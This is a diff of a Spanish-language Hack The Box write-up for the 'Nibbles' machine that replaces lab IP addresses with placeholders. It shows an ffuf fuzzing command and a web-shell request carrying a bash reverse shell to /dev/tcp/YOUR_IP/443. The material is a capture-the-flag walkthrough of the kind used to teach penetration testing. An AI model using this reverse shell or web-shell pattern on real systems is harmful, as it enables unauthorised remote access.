@@ -81,7 +81,7 @@ Dado que el lenguaje de programación del backend es `PHP`, empiezo a pensar en 
 A continuación, realizo fuzzing con `ffuf` (puedes usar `dirsearch`, `gobuster` , `wfuzz`, etc) utilizando un diccionario de [SecLists](https://github.com/danielmiessler/SecLists).
 
 ```shell
-ffuf -c -ic -w /usr/share/wordlists/SecLists-2025.2/Discovery/Web-Content/common.txt -u http://10.129.74.73/nibbleblog/FUZZ -mc all -fc 404
+ffuf -c -ic -w /usr/share/wordlists/SecLists-2025.2/Discovery/Web-Content/common.txt -u http://IP_VICTIM/nibbleblog/FUZZ -mc all -fc 404
 ```
 ![Nibbles](/assets/posts/2025-09-06-nibbles-machines-htb/06_nibbles.png)
 *Output ffuf*
@@ -135,7 +135,7 @@ http://IP_VICTIM/nibbleblog/content/private/plugins/my_image/image.php?cmd=cat /
 ¡Confirmado! Tengo **RCE**. Para obtener una **reverse shell**, usaré el primer payload de [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):
 
 ```shell
-http://10.129.74.73/nibbleblog/content/private/plugins/my_image/image.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.16.60/443 0>%261'
+http://IP_VICTIM/nibbleblog/content/private/plugins/my_image/image.php?cmd=bash -c 'bash -i >%26 /dev/tcp/YOUR_IP/443 0>%261'
 ```
 > Nota: Reemplazo `&` por `%26` usando URL encoding. 
 
